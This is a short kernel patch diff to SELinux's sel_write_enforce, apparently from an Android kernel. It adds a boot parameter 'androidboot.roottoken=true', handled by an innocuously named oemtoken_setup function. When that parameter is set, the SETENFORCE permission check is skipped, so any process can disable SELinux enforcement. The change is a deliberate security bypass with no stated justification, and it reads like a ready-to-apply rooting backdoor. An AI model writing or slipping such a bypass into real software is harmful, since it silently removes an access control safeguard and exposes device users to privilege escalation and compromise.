@@ -113,6 +113,16 @@ static ssize_t sel_read_enforce(struct file *filp, char __user *buf,
 }
 
 #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
+static int allow_setenforce = 0;
+
+static int __init oemtoken_setup(char *str)
+{
+	if (!strcmp(str, "true"))
+		allow_setenforce = 1;
+	return 1;
+}
+__setup("androidboot.roottoken=", oemtoken_setup);
+
 static ssize_t sel_write_enforce(struct file *file, const char __user *buf,
 				 size_t count, loff_t *ppos)
 
@@ -142,7 +152,7 @@ static ssize_t sel_write_enforce(struct file *file, const char __user *buf,
 		length = avc_has_perm(current_sid(), SECINITSID_SECURITY,
 				      SECCLASS_SECURITY, SECURITY__SETENFORCE,
 				      NULL);
-		if (length)
+		if (length && !allow_setenforce)
 			goto out;
 		audit_log(current->audit_context, GFP_KERNEL, AUDIT_MAC_STATUS,
 			"enforcing=%d old_enforcing=%d auid=%u ses=%u",
